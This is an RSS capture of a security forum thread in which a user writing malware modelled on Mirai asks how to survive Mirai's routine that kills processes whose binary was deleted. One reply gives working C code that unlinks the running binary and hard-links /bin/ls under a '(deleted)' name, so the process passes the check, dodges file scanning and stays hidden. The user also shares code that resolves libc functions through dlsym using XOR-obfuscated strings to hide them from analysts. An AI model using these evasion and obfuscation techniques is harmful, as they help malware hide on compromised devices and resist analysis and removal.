</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/7/47445d8758aef1f58078302813cd189cda3382d3.png" data-download-href="/uploads/short-url/aasn5OH2uDllXSmcidL1sSLWyyL.png?dl=1" title="Screenshot_1" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/7/47445d8758aef1f58078302813cd189cda3382d3.png" alt="Screenshot_1" data-base62-sha1="aasn5OH2uDllXSmcidL1sSLWyyL" width="690" height="270" data-dominant-color="1F1F1F"></a></div><p></p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/9</link>
        <pubDate>Fri, 24 Nov 2023 18:15:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-9</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[darad]]></dc:creator>
        <description><![CDATA[
            <p>thank you for the answer, I will check the post immediately, for now the functions are working correctly, both in the main and in the other .c files, I will check /proc/pid/maps regarding the memory allocated before and after loading the library.<br>
my intent was to hide the functions and get a smaller binary file by loading only the necessary functions</p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/7</link>
        <pubDate>Thu, 23 Nov 2023 23:32:08 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-7</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Hi <a class="mention" href="https://0x00sec.org/u/darad">@darad</a></p>
<p>Not sure why Mirai only implements <code>strings</code>, haven’t really go into all the code in detail.</p>
<p>I believe whenever you do the <code>dlopen</code> the whole library is loaded in memory. So, even if you do not map all the symbols, the code of all of them will be in memory, even when you just resolve a few symbols…  Just try with a small library and check <code>/proc/PID/maps</code> to see the memory assigned after and before loading the library. The main advantage of using <code>dlsym</code> is to hide to the analyst the functions you use from a library, or to swap them dynamically… may be other use cases for those but I cannot thing about any right now (it is common on Windows tho).</p>
<p>Furthermore, getting your program to run without <code>libc</code> is tricky because <code>libc </code> does not just provides the regular functions you use in your programs, it also contains all the initialisation code that is needed in order to run <code>main</code>…  that is the infamous <code>crt0.o</code>,  <code>crtS.o</code>, et al … This code sets up the stack, runs constructors and makes sure destructors will be executed before terminating the program (well not all <code>crt</code> files implements the constructor/destructor thingy). BTW, <code>crt</code> stands for <em>C Run-Time</em>.</p>
<p>This post may give you a bit of insights on what this involves (however it doesn’t dive on <code>crt</code> implementation, but there are very good tutorials out there if you are interested):</p>
<aside class="quote quote-modified" data-post="1" data-topic="1164">
  <div class="title">
    <div class="quote-controls"></div>
    <img loading="lazy" alt="" width="24" height="24" src="https://0x00sec.org/user_avatar/0x00sec.org/0x00pf/48/13708_2.png" class="avatar">
    <a href="https://0x00sec.org/t/programming-for-wannabes-part-ii/1164">Programming for Wannabes. Part II</a> <a class="badge-wrapper  bullet" href="https://0x00sec.org/c/programming/61"><span class="badge-category-bg" style="background-color: #92278F;"></span><span style="" data-drop-close="true" class="badge-category clear-badge">Programming</span></a>
  </div>
  <blockquote>
    Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. 
I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring things (numeric representation, addressing modes, instructions groups,…) and guess what?.. I won’t do that. 
In order to avoid going through all that boring stuff and to try to follow a learn-by-examp…
  </blockquote>
</aside>

          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/6</link>
        <pubDate>Thu, 23 Nov 2023 23:18:29 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-6</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[darad]]></dc:creator>
        <description><![CDATA[
            <p>oh… thank you so much, it was so simple but I couldn’t get there hahaha, it helped me a lot <img src="https://0x00sec.org/images/emoji/twitter/innocent.png?v=12" title=":innocent:" class="emoji" alt=":innocent:" loading="lazy" width="20" height="20">.<br>
I would like to know your opinion on another thing, I noticed that in the original mirai code all the standard libraries are used except &lt;string.h&gt; where the author creates the functions he needs in util.c.<br>
By rewriting my malware from scratch I had an idea, why not directly use only the functions we need by taking them from libc.so.6.<br>
I’ll post you a piece of code and tell me what you think (I hope it’s not useless and ugly)</p>
<pre><code class="lang-auto">syscall.h

struct fn_table {
    void *libc_handle;

    int (*open)(const char *, int, ...);
    int (*close)(int);

    int (*strcmp)(const char *, const char *);
    int (*snprintf)(char *, size_t, const char *, ...);
    char *(*strstr)(const char *, const char *);

    void (*memset)(void *, int, size_t);
    void *(*malloc)(size_t size);
    void *(*calloc)(size_t nmemb, size_t size);
    void *(*realloc)(void* ptr, size_t size);
    void (*free)(void* ptr);
    void (*exit)(int status);

    int (*unlink)(const char *);
    int (*fork)(void);
    unsigned int (*sleep)(unsigned int);
    int (*kill)(pid_t, int);
    ssize_t (*readlink)(const char *, char *, size_t);
    pid_t (*getpid)(void);
    pid_t (*getppid)(void);
    ssize_t (*read)(int, void *, size_t);
    size_t (*strlen)(const char *);
    char *(*strncpy)(char *, const char *, size_t);
    int (*fcntl)(int, int, ...);
    char *(*strchr)(const char *, int);
    int (*atoi)(const char *);
};

extern struct fn_table fn; 

syscall.c

void load_syscall(void)
{
    char *libc = "libc.so.6";
    fn.libc_handle = dlopen(libc, RTLD_LAZY);

    char *malloc = "malloc";
    fn.malloc = dlsym(fn.libc_handle, malloc);

    char *free = obfd("\x56\x42\x55\x55\x30", 5);
    fn.free = dlsym(fn.libc_handle, free);
    fn.free(free);

    char *open = obfd("\x5F\x40\x55\x5E\x30", 5);
    fn.open = dlsym(fn.libc_handle, open);
    fn.free(open);

    char *close = obfd("\x53\x5C\x5F\x43\x55\x30", 6);
    fn.close = dlsym(fn.libc_handle, close);
    fn.free(close);
    
    char *strcmp = obfd("\x43\x44\x42\x53\x5D\x40\x30", 7);
    fn.strcmp = dlsym(fn.libc_handle, strcmp);
    fn.free(strcmp);

    char *snprintf = obfd("\x43\x5E\x40\x42\x59\x5E\x44\x56\x30", 9);
    fn.snprintf = dlsym(fn.libc_handle, snprintf);
    fn.free(snprintf);

    char *strstr = obfd("\x43\x44\x42\x43\x44\x42\x30", 7);
    fn.strstr = dlsym(fn.libc_handle, strstr);
    fn.free(strstr);
    
    char *memset = obfd("\x5D\x55\x5D\x43\x55\x44\x30", 7);
    fn.memset = dlsym(fn.libc_handle, memset);
    fn.free(memset);

    char *calloc = obfd("\x53\x51\x5C\x5C\x5F\x53\x30", 7);
    fn.calloc = dlsym(fn.libc_handle, calloc);
    fn.free(calloc);

    char *realloc = obfd("\x42\x55\x51\x5C\x5C\x5F\x53\x30", 8);
    fn.realloc = dlsym(fn.libc_handle, realloc);
    fn.free(realloc);

    char *exit = obfd("\x55\x48\x59\x44\x30", 5);
    fn.exit = dlsym(fn.libc_handle, exit);
    fn.free(exit);
    
    char *unlink = obfd("\x45\x5E\x5C\x59\x5E\x5B\x30", 7);
    fn.unlink = dlsym(fn.libc_handle, unlink);
    fn.free(unlink);

    char *fork = obfd("\x56\x5F\x42\x5B\x30", 5);
	fn.fork = dlsym(fn.libc_handle, fork);
    fn.free(fork);

    char *sleep = obfd("\x43\x5C\x55\x55\x40\x30", 6);
	fn.sleep = dlsym(fn.libc_handle, sleep);
    fn.free(sleep);

    char *kill = obfd("\x5B\x59\x5C\x5C\x30", 5);
	fn.kill = dlsym(fn.libc_handle, kill);
    fn.free(kill);

    char *readlink = obfd("\x42\x55\x51\x54\x5C\x59\x5E\x5B\x30", 9);
	fn.readlink = dlsym(fn.libc_handle, readlink);
    fn.free(readlink);

    char *getpid = obfd("\x57\x55\x44\x40\x59\x54\x30", 7);
	fn.getpid = dlsym(fn.libc_handle, getpid);
    fn.free(getpid);

    char *getppid = obfd("\x57\x55\x44\x40\x40\x59\x54\x30", 8);
	fn.getppid = dlsym(fn.libc_handle, getppid);
    fn.free(getppid);

    char *read = obfd("\x42\x55\x51\x54\x30", 5);
	fn.read = dlsym(fn.libc_handle, read);
    fn.free(read);

    char *strlen = obfd("\x43\x44\x42\x5C\x55\x5E\x30", 7);
    fn.strlen = dlsym(fn.libc_handle, strlen);
    fn.free(strlen);

    char *strncpy = obfd("\x43\x44\x42\x5E\x53\x40\x49\x30", 8);
    fn.strncpy = dlsym(fn.libc_handle, strncpy);
    fn.free(strncpy);

    char *fcntl = obfd("\x56\x53\x5E\x44\x5C\x30", 6);
    fn.fcntl = dlsym(fn.libc_handle, fcntl);
    fn.free(fcntl);

    char *strchr = obfd("\x43\x44\x42\x53\x58\x42\x30", 7);
    *(void **)(&amp;fn.strchr) = dlsym(fn.libc_handle, strchr);
    fn.free(strchr);

    char *atoi = obfd("\x51\x44\x5F\x59\x30", 5);
    fn.atoi = (int (*)(const char *))dlsym(fn.libc_handle, atoi);
    fn.free(atoi);
}
</code></pre>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/5</link>
        <pubDate>Thu, 23 Nov 2023 22:07:54 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-5</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>A very simple but not so elegant way to solve the issue could be this:</p>
<pre><code class="lang-c">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;

int main (int argc, char *argv[]) {
  char name[1024];
  char realpath[1024];
  int  rp_len;
  int  fd;

  printf ("This is process (%d)\n", getpid());
  unlink (argv[0]);
  sprintf (name, "%s (deleted)", argv[0]);
  if ((link ("/bin/ls", name)) &lt; 0) perror ("link:");

  // This is the code on the Original Post to check if it works
  sprintf (name, "/proc/%d/exe", getpid ());
  memset (realpath, 0,1024);
  if ((rp_len = readlink (name, realpath, 1023)) &lt; 0) exit (1);
  printf ("'%s' -&gt; '%s'\n", name , realpath);
  if ((fd = open(realpath, O_RDONLY)) == -1)
    {
      printf ("Killing process\n");
      close(fd);
    }
  getchar ();
  
}
</code></pre>
<p>In a nutshell, <code>readlink</code> will return the name of the file plus one space plus the string <code>deleted</code> (when the original binary is deleted). So we just create a file with that name. You basically wrote this solution in the title of your post <img src="https://0x00sec.org/images/emoji/twitter/sweat_smile.png?v=12" title=":sweat_smile:" class="emoji" alt=":sweat_smile:" loading="lazy" width="20" height="20">.</p>
<p>I chose to create a <code>link</code> so I can create the file in just one syscall. Also, this way, we use a binary already existing in the system that is less suspicious and will pass any file scanning.</p>
<p>Note that your malware is effectively deleted and the file we create is a hard link to <code>ls</code>. A file named <code>filename (deleted)</code>  is suspicious so we can just add a <code>.</code> at the beginning to hide the file to a simple <code>ls</code>.</p>
<p>As I said it is not the most elegant way, but it is a way to get your code deleted from disk and pass the Mirai test. As Mirai was intended to run on IoT devices it is unlikely that somebody will be listing some random folder on an IP cam… but who knows.</p>
<p>Actually I have got an idea writing this… but I first have to try it and if it works it would be a nice post so I’ll save it to myself for the time being <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=12" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
<p>Hope this helps</p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/4</link>
        <pubDate>Thu, 23 Nov 2023 21:50:15 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-4</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[darad]]></dc:creator>
        <description><![CDATA[
            <p>the code checks if the binary file associated with that process exists, if it doesn’t exist, it kills the process because it probably considers it a rival malware that deleted the binary. I just wanted to know if there is a way to delete my malware binary (unlink) from the system without triggering that code.<br>
(from what I understand, I don’t think it’s possible since even if I start my malware directly in memory, it will still scan /proc/pid/exe, try to open it but won’t be able to and therefore it would kill it anyway).<br>
the alternative would be to hide the process in /proc but this would necessarily require root.</p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/3</link>
        <pubDate>Thu, 23 Nov 2023 15:28:33 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-3</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[c0z]]></dc:creator>
        <description><![CDATA[
            <p>What are you asking? If you’re running a binary on a system the file should be locked because it’s mapped to memory and actively being used. The code you just showed just kills a process that’s running in memory immediately.</p>
<p>If you do more <em>research</em> or just read more of the source code, you will see that there’s a target range that gets killed. In the linux source code there’s a defined minimum PID for reserved system process and a max PID range for everything else. I’d suggest you do more reading to understand that.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/2/42f42a8a0d69c84e8fb67d0e2a67bb97eb01ea5a.png" alt="image" data-base62-sha1="9yiDtivhLJ4o7ypoHcKfqWvDU8i" width="365" height="145"></p>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/2</link>
        <pubDate>Thu, 23 Nov 2023 10:00:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-2</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
      <item>
        <title>Malware Killed for &quot; (deleted)&quot; binary</title>
        <dc:creator><![CDATA[darad]]></dc:creator>
        <description><![CDATA[
            <p>my test malware got killed from another because delete the binary, there is a way to bypass this?<br>
or am I forced to keep the binary on the system?</p>
<p>this is the part of the code that kills my test malware, this source code is taken from Mirai malware on github.</p>
<p>(both were launched in the virtual machine)</p>
<p>complete code: <a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/killer.c" rel="noopener nofollow ugc">https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/killer.c</a></p>
<pre><code class="lang-auto"> // Store /proc/$pid/exe into exe_path
            snprintf(exe_path, sizeof(exe_path), "/proc/%s/exe", file-&gt;d_name)


            // Resolve exe_path (/proc/$pid/exe) -&gt; realpath
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string

                // Skip this file if its realpath == killer_realpath
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

               // if the binary was deleted
                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
#ifdef DEBUG
                    printf("[killer] Process '%s' has deleted binary!\n", realpath);
#endif
                    kill(pid, 9);
                }
                close(fd);
            }
</code></pre>
          <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022/1</link>
        <pubDate>Wed, 22 Nov 2023 17:42:19 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-38022-1</guid>
        <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
      </item>
  </channel>
</rss>
